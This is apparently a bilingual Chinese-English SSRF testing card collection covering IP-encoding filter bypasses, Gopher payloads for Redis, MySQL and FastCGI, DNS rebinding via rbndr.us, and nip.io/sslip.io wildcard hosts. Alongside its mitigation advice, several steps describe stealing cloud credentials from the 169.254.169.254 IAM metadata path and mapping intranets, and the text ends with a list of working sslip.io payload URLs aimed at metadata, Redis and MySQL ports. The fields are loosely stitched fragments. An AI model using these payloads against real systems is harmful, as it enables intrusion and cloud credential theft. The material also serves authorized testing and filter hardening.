mitigation.en: Let a single standard parser canonicalize, reject userinfo/fragment confusion and non-canonical IPs, classify all resolved addresses, and recheck after redirects and every DNS event. After the fix, regress with the same positive, negative, and normal samples: all variants denied, legitimate targets preserved.

description.zh: 提交 http://2130706433/ 十进制整数地址；响应与 127.0.0.1 一致即黑名单按字面匹配失效。
description.en: Submit the decimal integer http://2130706433/; a response matching 127.0.0.1 defeats the literal blacklist.
Walk the list of 0x7f000001, 0177.0.0.1, 127.1, 127.000.000.001 and IPv6-mapped forms; every hit assembles a full bypass kit.

title.zh: 混入编码路径直达资源
title.en: Append encoded paths to reach assets

description.zh: 在变形地址后追加 URL 编码路径与 @ 混淆结构；过滤仍放行即可直达 /admin 等受保护内网资源。
description.en: Append percent-encoded paths and @ confusion to the variant address; still passing the filter reaches protected assets like /admin.

review.rationale: 这些 URL 是 SSRF 解析器差异载荷，应归 SSRF 分类。

prerequisites.zh: 已按 execution[0] 行 0、1、2 分别识别 Redis RESP、MySQL 握手占位和 FastCGI 帧占位。
prerequisites.en: Identify execution[0] lines 0, 1, and 2 as Redis RESP, a MySQL handshake placeholder, and a FastCGI frame placeholder.

prerequisites.zh: 具备隔离的 Redis、MySQL 与 FastCGI 测试服务以及各自协议日志，且仅发送无副作用握手/PING。
prerequisites.en: Have isolated Redis, MySQL, and FastCGI services with protocol logs and send only harmless handshakes or PING messages.

analysis.zh: split 阳性必须逐后端证明协议解析：Redis 识别 RESP，MySQL 识别完整握手/包，FastCGI 识别记录头。仅 TCP 连接、Gopher URL 被接受、或原两条省略号占位导致错误都不能证明协议利用。
analysis.en: Positive split evidence is backend-specific parsing: Redis recognizes RESP, MySQL recognizes a complete handshake or packet, and FastCGI recognizes a record header. A TCP connection, accepted Gopher URL, or errors from the two ellipsis placeholders do not prove protocol exploitation.

opsecTips.zh: 每个后端最多完成一次无害协议确认即停止，禁止执行 Redis 写 WebShell、数据库命令或 FastCGI 脚本执行。
opsecTips.en: Stop each backend after one harmless protocol confirmation; do not perform Redis web-file writes, database commands, or FastCGI script execution.

opsecTips.zh: 关闭三个测试服务，回滚 Redis 配置与键、清除协议捕获，并核对三行只存在于各自目标卡。
opsecTips.en: Shut down all three test services, roll back Redis configuration and keys, clear protocol captures, and verify each line exists only in its target card.

name.zh: Gopher 后端协议混合集（待拆分）

description.zh: 三行分别面向 Redis、MySQL 与 FastCGI，协议帧、权限条件和影响不同，不能保留为单一 Gopher 攻击链。
description.en: The three lines target Redis, MySQL, and FastCGI with different frames, privileges, and impacts and cannot remain one Gopher attack chain.

subCategory.zh: Gopher 后端协议拆分

overview.zh: Gopher 后端协议混合集（待拆分）用于第一行是完整 Redis RESP 写文件链，后两行是截断的 MySQL 与 FastCGI 帧占位；每行必须由对应后端卡解释。 审校时先确认执行主体、解析器、平台和授权测试对象，并保留未修改请求或命令作为正常基线。
overview.en: Mixed Gopher Backend-Protocol Corpus (Split Required) is intended for this boundary: The first line is a full Redis RESP file-write chain while the latter two are truncated MySQL and FastCGI frame placeholders; each needs a backend-specific card. Confirm the execution principal, parser, platform, and authorized test object, and retain an unmodified baseline.

vulnerability.zh: 服务端允许 gopher:// 并能连接内网 TCP 服务时，URL 路径字节可被下游协议解析；成功条件由各服务认证和配置决定。 结论必须落到实际信任边界，不能把字符串外观、工具输出或中间层状态变化直接当成漏洞。
vulnerability.en: When a server permits gopher:// and can reach internal TCP services, URL-path bytes may be parsed by downstream protocols, with success determined by each service's authentication and configuration. The conclusion must identify the real trust boundary rather than treating string appearance, tool output, or intermediary status changes as a vulnerability.

exploitation.zh: 按行索引路由到 Redis、MySQL 和通用 Gopher/FastCGI 卡，先使用只读 PING 或无副作用帧证明协议到达，不执行写文件链。 Redis、MySQL 或 FastCGI 服务日志必须解析出对应帧；TCP 连接、URL 接受或截断数据报错都不能共享成功结论。 全程关联原始输入、规范化结果、进程或网络日志和最终业务影响，形成可重复的阳性与阴性证据。
exploitation.en: Route indexes to Redis, MySQL, and generic Gopher/FastCGI cards and first prove protocol reachability with read-only PING or harmless frames rather than file writes. Redis, MySQL, or FastCGI logs must parse the matching frame; TCP connection, URL acceptance, or truncated-frame errors cannot share a success conclusion. Correlate raw input, canonicalized values, process or network logs, and final business impact to build repeatable positive and negative evidence.

mitigation.zh: 禁用 gopher 和非 HTTP scheme，限制内网出站，要求后端认证并绑定受信接口；对 Redis 和 FastCGI 额外收紧文件与脚本权限。 修复后用同一正常、阳性和阴性样例回归，确认合法功能保留，原先跨越解释器、文件或网络边界的差异消失。
mitigation.en: Disable gopher and non-HTTP schemes, restrict internal egress, require backend authentication and trusted-interface binding, and tighten file and script privileges for Redis and FastCGI. After remediation, replay the same normal, positive, and negative cases to preserve valid behavior and remove the former interpreter, file, or network-boundary difference.

title.zh: 确认Gopher 后端协议拆分适用边界
title.en: Confirm the Gopher Backend-Protocol Split boundary

description.zh: 第一行是完整 Redis RESP 写文件链，后两行是截断的 MySQL 与 FastCGI 帧占位；每行必须由对应后端卡解释。 记录正常输入、执行主体、组件版本和相关进程、文件或网络日志基线。
description.en: The first line is a full Redis RESP file-write chain while the latter two are truncated MySQL and FastCGI frame placeholders; each needs a backend-specific card. Record normal input, the execution principal, component version, and relevant process, file, or network-log baseline.

title.zh: 提交受控Gopher 后端协议拆分样例
title.en: Submit a controlled Gopher Backend-Protocol Split case

description.zh: 按行索引路由到 Redis、MySQL 和通用 Gopher/FastCGI 卡，先使用只读 PING 或无副作用帧证明协议到达，不执行写文件链。 一次只验证一种机制，并以唯一无害标记替代真实敏感读取、系统修改或无边界扫描。
description.en: Route indexes to Redis, MySQL, and generic Gopher/FastCGI cards and first prove protocol reachability with read-only PING or harmless frames rather than file writes. Validate one mechanism at a time and use a unique harmless marker instead of sensitive reads, system changes, or unbounded scanning.

title.zh: 核对Gopher 后端协议拆分证据

description.zh: Redis、MySQL 或 FastCGI 服务日志必须解析出对应帧；TCP 连接、URL 接受或截断数据报错都不能共享成功结论。 对齐各层时间戳并排除输入回显、缓存、统一错误、网络抖动和测试工具自身行为。
description.en: Redis, MySQL, or FastCGI logs must parse the matching frame; TCP connection, URL acceptance, or truncated-frame errors cannot share a success conclusion. Align timestamps across layers and exclude reflection, caching, generic errors, network jitter, and behavior caused by the test tool itself.

title.zh: 修复并回归Gopher 后端协议拆分
title.en: Remediate and regress Gopher Backend-Protocol Split

description.zh: 禁用 gopher 和非 HTTP scheme，限制内网出站，要求后端认证并绑定受信接口；对 Redis 和 FastCGI 额外收紧文件与脚本权限。 重放相同三组基线，合法路径应保持可用，异常输入不得再改变执行、文件访问或最终连接目标。
description.en: Disable gopher and non-HTTP schemes, restrict internal egress, require backend authentication and trusted-interface binding, and tighten file and script privileges for Redis and FastCGI. Replay the same three baselines; valid paths should remain functional and anomalous input must no longer alter execution, file access, or final destinations.

review.rationale: 三行目标后端协议不同，且两行只是截断帧，必须逐行路由。

prerequisites.zh: 第三方 rbndr.us 当前解析行为、TTL 和返回地址顺序已在隔离解析器中确认。
prerequisites.en: Confirm current rbndr.us resolution behavior, TTL, and address order in an isolated resolver.

prerequisites.zh: 外部与回环两端均为受控标记服务，且 HTTP 客户端的 DNS 缓存/重试行为可观测。
prerequisites.en: Both external and loopback endpoints are controlled marker services, and HTTP-client DNS caching and retries are observable.

analysis.zh: 阳性需权威/递归 DNS 日志显示校验与连接使用了不同答案，并由内部标记服务收到同一令牌。域名能解析两个 IP、TTL 很低、首答为外部或第三方服务偶发失败都不代表 rebinding 成功。
analysis.en: Positive evidence requires DNS logs showing different answers at validation and connection and the internal marker receiving the same token. Resolving two IPs, a low TTL, an external first answer, or third-party instability does not prove rebinding.

opsecTips.zh: 一旦受控回环端收到令牌就停止，不把域名对替换为云元数据或真实私网地址。
opsecTips.en: Stop once the controlled loopback endpoint receives the token; do not replace address pairs with cloud metadata or real private hosts.

opsecTips.zh: 清除解析器/客户端缓存，关闭两个标记服务，并从测试记录中删除第三方域名令牌和内部地址。
opsecTips.en: Clear resolver and client caches, shut down both marker services, and remove third-party domain tokens and internal addresses from test records.

name.zh: rbndr.us DNS Rebinding 地址切换

description.zh: 使用 rbndr.us 双地址域名在回环、链路本地与私网地址间切换，验证 DNS 校验和连接阶段是否分离。
description.en: Uses rbndr.us dual-address hostnames that alternate among loopback, link-local, and private addresses to test separation between DNS validation and connection.

subCategory.zh: 地址变形与 DNS 解析绕过

overview.zh: rbndr.us DNS Rebinding 地址切换覆盖公共重绑定域名场景：针对先解析校验后连接的服务端取回功能，验证 rbndr.us 双地址编码域名能否让校验与连接阶段的解析结果分离。验证维度涵盖回环、链路本地与私网地址对的逐条切换验证。
overview.en: rbndr.us DNS Rebinding Address Switching covers public rebinding domains: for fetchers that resolve-validate before connecting, verify whether rbndr.us dual-address encoded domains split resolution between validation and connection. Verification dimensions validate loopback, link-local, and private address pairs one by one.

vulnerability.zh: 根因是应用只校验首次 DNS 结果或缓存主机字符串，后续解析可能返回受阻地址，形成检查时与使用时差异；rbndr.us 域名行为还依赖第三方 DNS 当前服务与缓存，必须在隔离环境验证并留存解析记录。
vulnerability.en: The root cause is the application validating only the first DNS answer or caching the host string, letting later resolutions return blocked addresses — a check-time versus use-time divergence; rbndr.us behavior also depends on the third-party DNS's current service and caching, so isolated validation with retained resolution records is mandatory.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步先记录连续 DNS 查询、TTL 与全部 A/AAAA 结果；再让服务端请求 7f000001.a9fea9fe.rbndr.us 等交替域名指向受控回环标记端口，两次解析返回不同地址且取回器在第二次命中目标网段、标记服务收到应用请求即确认 TOCTOU 缺口。不访问元数据或真实内网服务。占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 first records consecutive DNS queries, TTLs, and all A/AAAA answers; then have the server request alternating domains such as 7f000001.a9fea9fe.rbndr.us toward a controlled loopback marker port — two resolutions returning different addresses, the fetcher hitting the target segment on the second, and the marker service receiving the application request confirm the TOCTOU gap. Never touch metadata or real intranet services. Replace placeholders via the global variables menu.

mitigation.zh: 校验并固定解析后的允许地址，连接时使用固定 IP 与正确 Host/SNI；重定向和重解析均重新执行地址分类，并限制出站网络。修复后用同一正常、阳性和阴性样例回归：解析不一致时连接被拒绝。
mitigation.en: Validate and pin the approved resolved address, connect using a fixed IP with correct Host/SNI; re-run address classification on redirects and re-resolutions, and restrict egress networking. After the fix, regress with the same positive, negative, and normal samples: connections denied when resolutions disagree.

title.zh: 解析重绑定域名双地址

description.zh: 提交 http://7f000001.a9fea9fe.rbndr.us；域名两次解析分别得到 127.0.0.1 与 169.254.169.254 即重解析生效。
description.en: Submit http://7f000001.a9fea9fe.rbndr.us; the domain resolving to 127.0.0.1 then 169.254.169.254 confirms rebinding is live.

description.zh: 对比首次校验请求与实际取值请求这两次解析记录的差异；前后地址不同即先检查后连接的防护被时序差成功击穿。
description.en: Compare the resolutions of the validation request and the fetch request; different addresses pierce check-then-connect defenses through timing.

title.en: Redirect the chain at cloud metadata

description.zh: 调整前后缀组合让第二跳落在 169.254.169.254；返回凭证字段即借重绑定通道完成云凭据窃取。
description.en: Recompose the suffix so the second hop lands on 169.254.169.254; credential fields returned complete cloud key theft over the rebind channel.

review.rationale: 域名是 DNS Rebinding SSRF Payload，不是 DNS 工具命令。

description.zh: 绕过对固定顺序十六进制段的匹配：前后地址对调后服务在两次解析间切换目标；两次请求源 IP 不同即重绑定生效。
description.en: Swap the hex segments so resolution alternates between two targets past fixed-order matching; differing source IPs across requests confirm rebinding.

description.zh: 绕过只监控私网目标段的规则：一侧置零地址观察解析行为；DNS 应答在两值间变化即成功。
description.en: Set one side to the zero address against private-range-only monitoring; DNS answers alternating between the two values confirm success.

description.zh: 绕过对默认端口形态的检测：在重绑定域名上直接挂端口扫描；端口开放差异响应可辨即成功。
description.en: Attach port probes directly to the rebinding domain against default-port assumptions; distinguishable open/closed responses confirm success.

prerequisites.zh: 已从 nip.io 官方实现和实时 DNS 查询确认嵌入 IPv4 的主机名当前解析规则。
prerequisites.en: Confirm current embedded-IPv4 hostname resolution from the nip.io implementation and live DNS queries.

prerequisites.zh: 选择一个解析到受控回环服务的 URL，并能记录 A/AAAA、TTL、最终连接 IP 与请求令牌。
prerequisites.en: Choose one URL resolving to a controlled loopback service and record A or AAAA answers, TTL, final IP, and request token.

analysis.zh: 阳性是主机字符串绕过表面规则后，应用最终连接 nip.io 解析出的内网/回环标记服务。只获得 A 记录、访问 nip.io 公共页面、连接被防火墙拒绝或浏览器发起请求都是假阳性。
analysis.en: Positive evidence is the application connecting to the internal or loopback marker resolved through nip.io after bypassing a superficial host rule. An A record alone, the nip.io landing page, firewall rejection, or a browser-originated request is false positive.

opsecTips.zh: 一个 nip.io 主机成功到达标记端口后停止，不遍历数据库、Kubernetes 或元数据端口列表。
opsecTips.en: Stop after one nip.io host reaches the marker port; do not enumerate database, Kubernetes, or metadata ports.

opsecTips.zh: 关闭标记服务并清理 DNS/HTTP 缓存，删除访问日志中的完整内网 URL 和令牌。
opsecTips.en: Shut down the marker service, clear DNS and HTTP caches, and remove full internal URLs and tokens from access logs.

name.zh: nip.io 通配 DNS SSRF 目标

description.zh: 使用把 IPv4 嵌入主机名的 nip.io 域名指向回环、链路本地和私网服务，测试主机名允许列表缺口。
description.en: Uses nip.io hostnames embedding IPv4 addresses to resolve to loopback, link-local, and private services and test hostname-allowlist gaps.

subCategory.zh: 地址变形与 DNS 解析绕过

overview.zh: nip.io 通配 DNS SSRF 目标覆盖通配域名绕过场景：针对按主机名后缀或字面规则过滤的取回功能，验证把 IPv4 嵌入主机名的 nip.io 域名能否解析到回环、链路本地与私网服务。验证维度涵盖十二个嵌入 IP 域名的解析与请求对照。
overview.en: nip.io Wildcard-DNS SSRF Targets covers wildcard-domain bypass: for fetchers filtering by hostname suffix or literal rules, verify whether nip.io domains embedding IPv4 resolve to loopback, link-local, and private services. Verification dimensions compare resolution and requests across twelve embedded-IP domains.

vulnerability.zh: 根因是校验只检查主机字符串后缀或拒绝 IP 字面量，却未解析并分类 DNS 结果，通配 DNS 因此把看似合法的域名绑定到内部目标；域名文本与解析后地址的分离是所有通配 DNS 绕过的共同缺口。
vulnerability.en: The root cause is validation inspecting only the host string suffix or rejecting IP literals without resolving and classifying DNS answers, so wildcard DNS binds seemingly legitimate names to internal targets; the split between name text and resolved address is the shared gap of all wildcard-DNS bypasses.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步先离线查询 169.254.169.254.nip.io、192.168.1.1.nip.io 等域名的 A/AAAA 与 TTL，确认嵌入地址与解析结果一致；再由应用请求一个固定标记路径并捕获最终连接 IP，受控内网服务日志与 HTTP 客户端连接地址一致即确认绕过成立。DNS 成功或公共服务页面都不是证据。占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 first queries A/AAAA and TTLs offline for domains like 169.254.169.254.nip.io and 192.168.1.1.nip.io, confirming embedded addresses match resolutions; then have the application request one fixed marker path and capture the final connected IP — agreement between the intranet service's log and the HTTP client's connection address confirms the bypass. DNS success or a public service page is not evidence. Replace placeholders via the global variables menu.

mitigation.zh: 对解析后的所有地址执行网段阻断，避免基于字符串后缀允许 URL，并在每次重定向和 DNS 刷新后重新校验。修复后用同一正常、阳性和阴性样例回归：通配域名目标被拒绝，合法域名保留。
mitigation.en: Apply network-range blocking to all resolved addresses, avoid allowing URLs by string suffix, and revalidate after every redirect and DNS refresh. After the fix, regress with the same positive, negative, and normal samples: wildcard-domain targets denied, legitimate names preserved.

description.zh: 提交 http://169.254.169.254.nip.io；域名解析回链路本地地址且返回元数据目录即绕过对纯 IP 的过滤。
description.en: Submit http://169.254.169.254.nip.io; the domain resolving to the link-local address and returning metadata bypasses the plain-IP filter.

title.en: Reuse the trick to sweep the intranet

description.zh: 把前缀替换为 10.0.0.x、127.0.0.1 等地址逐一提交；响应差异即可批量测绘内网，全程使用同一域名形态。
description.en: Swap the prefix to 10.0.0.x or 127.0.0.1 hosts and submit; response differences map the intranet while every request wears a domain shape.

description.zh: 沿 /latest/meta-data/iam/security-credentials/ 深入请求；拿到 AK/SK 即以实例身份进入云控制面。
description.en: Walk into /latest/meta-data/iam/security-credentials/; AK/SK in hand enters the cloud control plane as the instance.

review.rationale: nip.io URL 是主机名到内网地址的 SSRF 载荷。

description.zh: 绕过对点分嵌入 nip.io 形式的匹配：短横线形式解析等价；内网服务响应出现即成功。
description.en: Use the dash form that resolves identically past dotted-embedding matching; an internal service response appearing confirms success.

description.zh: 绕过对全小写通配域名的规则：域名部分大写，DNS 不区分大小写；元数据返回即成功。
description.en: Uppercase the domain against lowercase wildcard rules since DNS is case-insensitive; returned metadata confirms success.

description.zh: 绕过对"IP 开头域名"直接判定的过滤：加业务风格前缀子域；解析仍指向目标地址即成功。
description.en: Prepend a business-style subdomain so the hostname no longer starts with an IP; resolution still pointing at the target confirms success.

description.zh: 绕过对点分 sslip.io 形式特征的匹配：短横线写法等价解析；内网设备页面返回即成功。
description.en: Use the dash notation that resolves identically past dotted-form signatures; an internal device page returning confirms success.

description.zh: 绕过对十进制 IP 段的规则：十六进制形式同样被通配解析；目标端口响应差异可辨即成功。
description.en: Use hex forms still matched by the wildcard against decimal-range rules; distinguishable target port responses confirm success.

description.zh: 绕过对紧凑十进制匹配：补零形式解析等价；网关管理页可达即成功。
description.en: Use zero-padded forms that resolve identically against compact decimal matching; a reachable gateway admin page confirms success.

title.en: Validation step 1 for sslip.io Wildcard-DNS SSRF Targets

wafBypass.command:
http://169.254.169.254.sslip.io
http://192.168.1.1.sslip.io
http://10.0.0.1.sslip.io
http://172.16.0.1.sslip.io
http://0.0.0.0.sslip.io
http://127.0.0.1.sslip.io:8080
http://169.254.169.254.sslip.io:80
http://192.168.1.1.sslip.io:3306
http://10.0.0.1.sslip.io:6379
http://127.0.0.1.sslip.io/latest/meta-data/
http://169.254.169.254.sslip.io/latest/meta-data/
